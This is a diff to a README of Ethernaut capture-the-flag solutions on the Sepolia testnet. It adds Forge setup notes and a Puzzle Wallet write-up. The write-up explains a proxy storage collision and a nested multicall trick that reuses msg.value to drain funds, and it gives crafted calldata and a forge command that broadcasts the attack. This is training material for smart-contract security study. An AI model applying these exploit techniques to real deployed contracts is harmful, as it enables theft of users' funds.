@@ -5,9 +5,18 @@ Original source code copied from the [Ethernaut GitHub](https://github.com/OpenZ
 All original source code licensed under [MIT license](./LICENSE).
 
 ```shell
-export SEPOLIA_RPC_URL="$SEPOLIA_RPC_URL"
+export SEPOLIA_RPC_URL="..." #  https://chainlist.org/chain/11155111
 export LOCAL_RPC_URL='http://localhost:8545'
 ```
+
+Linking the `ethernaut` repo as a Forge package:
+
+```shell
+forge install https://github.com/OpenZeppelin/ethernaut
+unlink ./04_Blockchain_for_Security_Tester/ethernaut/lib/ethernaut/client/src/contracts
+```
+
+Then fix the [remappings.txt](./remappings.txt) (autodetect doesn't work correctly in current (0.2.0 dbc48ea) Forge version). This is not perfect solution as there will be strange collisions if you try importing some contracts like `Ethernaut.sol`
 
 ## Fallback
 
@@ -381,6 +390,45 @@ $ cast send \
     --interactive \
     "$ADDRESS_Preservation" \
     "setFirstTime(uint256)" "0x000000000000000000000000<ADDRESS_Attacker>"
+```
+
+---
+
+## Puzzle Wallet
+
+### Storage layout
+
+| Slot | PuzzleProxy variable | PuzzleWallet variable | Initial value|
+| --- | --- | --- | --- |
+| 0 | address pendingAdmin | address owner | _Level address_ |
+| 1 | address admin | uint256 maxBalance | _Level address_ |
+| _IMPLEMENTATION_SLOT | address implementation | - | _PuzzleWallet address_ |
+
+### Attack
+
+1. As we have a storage collision, we can become the _Wallet_ owner by setting the `pendingAdmin` in the _Proxy_ to our address;
+2. To become the _Proxy_ `admin` we need to set the _Wallet_ `maxBalance` to our address.
+    1. This is possible only if we drain funds from the contract first. The way to do that is to call `deposit()` a few times in the single `multicall(bytes[])` call.
+    2. Finally, we need to bypass the `depositCalled` flag check. This can be done by using nested call to the `multicall` inside the `multicall`.
+
+See more in the final [AttackPuzzleWallet script](./script/AttackPuzzleWallet.s.sol) or [tests](./test/PuzzleWallet.t.sol).
+
+```shell
+$ cast sig "deposit()"
+0xd0e30db0
+
+$ cast calldata "multicall(bytes[])" "[0xd0e30db0]"
+0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000
+
+# This calldata will execute nested multicall() with deposit() and then regular deposit() thus using the same msg.value twice.
+$ cast pretty-calldata --offline $(cast calldata "multicall(bytes[])" \
+"[\
+0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000,\
+0xd0e30db0\
+]")
+
+$ export PRIVATE_KEY="0x...";
+$ forge script --rpc-url=$SEPOLIA_RPC_URL --broadcast AttackPuzzleWallet
 ```
 
 ---
